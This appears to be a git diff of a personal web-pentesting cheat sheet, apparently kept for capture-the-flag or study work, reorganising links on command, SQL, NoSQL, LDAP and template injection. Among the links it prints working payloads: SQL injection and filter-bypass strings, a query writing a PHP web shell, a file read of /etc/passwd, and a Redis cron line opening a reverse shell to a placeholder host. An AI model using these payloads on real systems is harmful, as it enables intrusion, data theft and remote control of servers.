@@ -214,6 +214,12 @@ sudo systemctl restart httpd
 - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces
 
 
+## Command Injection
+
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection
+
+
 ## Path Traversal
 
 - https://owasp.org/www-community/attacks/Path_Traversal
@@ -293,28 +299,39 @@ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
 ## SQLi
 
 - https://phptherightway.com/#databases (`mysqli`|| `pdo` connectors)
-- `Protection`:
-  - `mysqli::prepare`: https://websitebeaver.com/prepared-statements-in-php-mysqli-to-prevent-sql-injection
-    - https://www.php.net/manual/en/mysqli.real-escape-string.php
-    - https://www.php.net/manual/en/mysqli.prepare.php
-    - https://dev.mysql.com/doc/c-api/8.0/en/c-api-prepared-statement-interface.html
-  - `PDO::prepare`: https://websitebeaver.com/php-pdo-prepared-statements-to-prevent-sql-injection
-    - https://www.php.net/manual/en/pdo.prepared-statements.php
-    - https://www.php.net/manual/en/pdo.setattribute.php#121309
-    - https://stackoverflow.com/questions/10113562/pdo-mysql-use-pdoattr-emulate-prepares-or-not # turn off emulation mode for "real" prepared statements
-  - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 
-### BEUST, Fragmented, PDO::prepare Emulation Mode SQLis
 
-- https://zestedesavoir.com/tutoriels/945/les-injections-sql-le-tutoriel/
+### Blind/Error based/Stacked Queries/Union based/Time based SQLIs
+
 - https://pentestmonkey.net/cheat-sheet/sql-injection/
-- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
-- https://www.invicti.com/blog/web-security/fragmented-sql-injection-attacks/
-- https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-cheat-sheet/
-- https://exploit-notes.hdks.org/exploit/web/security-risk/sql-injection-with-sqlmap/
-- https://slcyber.io/assetnote-security-research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/  # Test \'? and ?%00 escapes
+- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet     # Database identification
+- https://exploit-notes.hdks.org/exploit/web/sql-injection-cheat-sheet/
+- https://exploit-notes.hdks.org/exploit/web/sql-injection-using-sqlmap/
 
-`Union classic`:
+
+`Protection`:
+
+- https://phpdelusions.net/mysqli_examples/prepared_select
+- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+- `mysqli::prepare`: https://websitebeaver.com/prepared-statements-in-php-mysqli-to-prevent-sql-injection
+  - https://www.php.net/manual/en/mysqli.real-escape-string.php
+  - https://www.php.net/manual/en/mysqli.prepare.php
+  - https://dev.mysql.com/doc/c-api/8.0/en/c-api-prepared-statement-interface.html
+- `PDO::prepare`: https://websitebeaver.com/php-pdo-prepared-statements-to-prevent-sql-injection
+  - https://www.php.net/manual/en/pdo.prepared-statements.php
+  - https://www.php.net/manual/en/pdo.setattribute.php#121309
+  - https://stackoverflow.com/questions/10113562/pdo-mysql-use-pdoattr-emulate-prepares-or-not # turn off emulation mode for "real" prepared statements
+  
+#### Union based
+
+- https://www.geeksforgeeks.org/pagination-in-sql/
+- https://portswigger.net/web-security/sql-injection
+- https://zestedesavoir.com/tutoriels/945/les-injections-sql-le-tutoriel/
+
+```sql
+' UNION SELECT username from table LIMIT 1 OFFSET X # 0||1||2 etc.. 
+```
 
 ```sql
 ' union select 0,0,0,0 #
@@ -326,15 +343,17 @@ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
 ' union select id, origine, message, 0 from chall #
 ```
 
-### Pagination
+#### Blind
 
-- https://www.geeksforgeeks.org/pagination-in-sql/
+- https://wiki.zenk-security.com/doku.php?id=failles_web:blind_sql_injection
+- https://web.archive.org/web/20120827032339/http://www.ghostsinthestack.org/article-11-blind-sql-injections.html
 
 ```sql
-' UNION SELECT username from table LIMIT 1 OFFSET X # 0||1||2 etc.. 
+admin' and length(password)=8--
+admin' and (select substr(password,1,1)='a')--
 ```
 
-### R/W file
+### Read / Write 
 
 ```sql
 # Read file
@@ -344,11 +363,25 @@ UNION SELECT LOAD_FILE ("etc/passwd")--
 UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-
 ```
 
-### RCE - GCC extension
+#### RCE - GCC extension
 
 - https://pentestmonkey.net/category/tools/audit
 
-`Protection`: [quoted & prepared statements](https://phpdelusions.net/mysqli_examples/prepared_select)
+### Fragmented
+
+- https://www.invicti.com/blog/web-security/fragmented-sql-injection-attacks/
+
+### PDO prepared statements (Emulation MODE)
+
+- https://slcyber.io/assetnote-security-research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/  # Test \'? and ?%00 escapes
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#pdo-prepared-statements
+
+#### Second Order
+
+- https://portswigger.net/kb/issues/00100210_sql-injection-second-order
+- https://book.hacktricks.wiki/en/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap.html
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#second-order-sql-injection
+
 
 ### Bypass Filters
 
@@ -357,7 +390,16 @@ UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-
 - http://pims.tuxfamily.org/blog/2011/04/write-up-sha1-is-fun-plaidctf/
 
 
-## NoSQLi
+```sql 
+'/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'xyz'-- d
+' UNION SELECT 0x73272067726f757020627920322d2d2064-- d
+%20 %09 %0a %0b %0c %0d %a0 /**/
+mid(password,1,1) = 'a'     # substring alternative
+```
+
+### Others
+
+#### NoSQLI
 
 - https://www.mongodb.com/community/forums/t/unrecognized-pipeline-stage-name-search/111883
 - https://www.dailysecurity.fr/nosql-injections-classique-blind/
@@ -366,34 +408,23 @@ UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-
 https://www.vulnerable.com/search?id=23277%22}},{%22$lookup%22:{%22from%22:%22flag%22,%22as%22:%22str%22,%22foreignField%22:%22flag%22,%22localField%22:%22flag
 ```
 
+#### LDAP injection
 
-## SSTI
+- https://wiki.zenk-security.com/doku.php?id=failles_web:ldap_injection
+
+#### XPATH injection
+
+- https://wiki.zenk-security.com/doku.php?id=failles_web:xpath_injection
+
+
+## Server Side Template Injection
 
 - https://cheatsheet.hackmanit.de/template-injection-table/
-- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
-
-### .NET - Razor
-
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/ASP.md
-
-### Java - EL, Freemarker, Groovy, Spring
-
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md
-
-### Node - HandleBars, Lodash, Pug
-
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md
-
-### PHP - Blade, Smarty, Twig, Latte
-
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md
-
-### Python - Django, Jinja2, Tornado, Mako
-
-- https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html
-
-### Ruby - ERB, Slim
-
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md
 
 
@@ -552,6 +583,12 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 ```
 Header Set-Cookie: mettre le scope de l'attribut SameSite = None
 ```
+
+### WebSocket abuse
+
+- https://book.hacktricks.wiki/en/pentesting-web/websocket-attacks.html
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Sockets
+
 
 ## XSS
 
